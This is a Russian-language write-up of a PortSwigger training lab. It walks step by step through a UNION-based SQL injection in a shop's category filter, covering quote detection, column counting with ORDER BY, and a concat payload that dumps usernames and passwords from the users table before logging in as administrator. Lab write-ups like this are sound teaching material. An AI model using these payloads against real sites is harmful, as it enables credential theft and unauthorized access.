---
title: "SQL injection UNION attack retrieving multiple values in a single column"
date: 2025-06-20
tags: [sqli, writeup, web]  
tagline: ""
header:
  overlay_image: /assets/images/ps_logo.webp
  overlay_filter: 0.5 
  actions:
    - label: "Lab PortSwigger"
      url: "https://portswigger.net/web-security/learning-paths/sql-injection/sql-injection-retrieving-multiple-values-within-a-single-column/sql-injection/union-attacks/lab-retrieve-multiple-values-in-single-column"
---

В данной лабе есть уязвимый к **SQL injection** фильтр категории. В БД есть таблицы с именам `users` и колонками `username` и `password`. Для решения лабораторной работы нужно выполнить атаку с помощью `SQL`-инъекции, войдя под пользователем `administrator`.

```
https://0a3300e7041babb2811b346f0068004e.web-security-academy.net/
```

## Solution

Из условия лабы известно, что уязвимость находится в фильтре категорий. Поэтому возьму `URL` с фильтром `Accessories`:

```
https://0a3300e7041babb2811b346f0068004e.web-security-academy.net/filter?category=Accessories
```

Следующим моим шагом будет подбор обрамления. Предположу, что запрос выглядит так:

```sql
SELECT * FROM table WHERE category = 'Accessories'
```

Тогда пейлоад должен иметь следующий вид:

```
Accessories' and false-- -
```

![IMG](/assets/images/IMG_union_sqli/IMG_SQL-injection-UNION-attack-retrieving-multiple-values-in-a-single-column/1.png){: height="200" .align-center}

Выдало пустую страницу без ошибок, значит в качестве обрамеления используется `'`.

Далее узнаю количество колонок в запросе с помощью `ORDER BY`:

```
Accessories' ORDER BY 10-- -Error
Accessories' ORDER BY 5-- - Error
Accessories' ORDER BY 3-- -Error
Accessories' ORDER BY 2-- - OK
```

Значит у нас используется 2 колонки в запросе. Попробую использовать `UNION` для отображения информации:

```
Accessories' UNION SELECT 1, 2-- -Error
Accessories' UNION SELECT 1, '2'-- -OK
```

Я получил вот такое отображение на страницу:

![IMG](/assets/images/IMG_union_sqli/IMG_SQL-injection-UNION-attack-retrieving-multiple-values-in-a-single-column/2.png){: height="200" .align-center}

Значит отображается информация только из второй колонки, а мне нужно получить `login` и `password` из таблицы `table`. Это можно сделать с помощью двух запросов, либо же использовать конкатенацию строк с помощью `concat`. Мой пейлоад будет иметь следующий вид:

```
Accessories' UNION SELECT 1, concat('1', '2')-- -
```

А вот так это отображается на странице:

![IMG](/assets/images/IMG_union_sqli/IMG_SQL-injection-UNION-attack-retrieving-multiple-values-in-a-single-column/3.png){: height="200" .align-center}

Теперь попробую получить нужные данные. Я добавил условие `0=1`. Теперь у меня отображается только вторая часть моего запроса, то есть логины и пароли:

```
Accessories' and 0=1 UNION SELECT NULL, concat(username, ':' ,password) FROM users-- -
```

Я получил следующий вывод:

![IMG](/assets/images/IMG_union_sqli/IMG_SQL-injection-UNION-attack-retrieving-multiple-values-in-a-single-column/4.png){: height="200" .align-center}

Теперь зайду в аккаунт под пользователем `administrator`:

![IMG](/assets/images/IMG_union_sqli/IMG_SQL-injection-UNION-attack-retrieving-multiple-values-in-a-single-column/5.png){: height="200" .align-center}

Победа)
